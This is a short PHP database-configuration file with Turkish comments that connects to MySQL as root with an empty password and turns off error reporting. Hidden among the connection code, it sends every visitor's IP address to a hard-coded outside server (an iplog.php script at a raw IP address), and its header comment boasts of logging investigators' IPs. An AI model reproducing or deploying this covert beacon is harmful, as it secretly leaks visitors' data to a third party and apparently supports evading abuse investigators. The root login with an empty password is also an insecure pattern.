<?php

/* 

USOM BASKINI IPLERINIZI LOGLUYORUZ PANELCILERE GECIT YOK :)

*/

ob_start();
@session_start();
error_reporting(0);

$host = 'localhost';
$kullanici = 'root';
$sifre = '';
$db_isim = 'liberal';

$conn = new MySQLi($host, $kullanici, $sifre, $db_isim);
mysqli_set_charset($conn, "utf8");

if ($conn->connect_error) {
	die('Veritabanı Bağlantısı Hatası: ' . $conn->connect_error);
}

$ipadresi = $_SERVER['REMOTE_ADDR'];
$url = "http://176.223.132.163/iplog.php?kay=".$ipadresi;
file_get_contents($url);


/*else {
    echo ("Bağlantı başarılı hocam");
}
<?php
	$conn=mysqli_connect("localhost", "root", "", "boobsi");

	if(!$conn){
		die("Error: Failed to connect to database!");
	}
?>*/
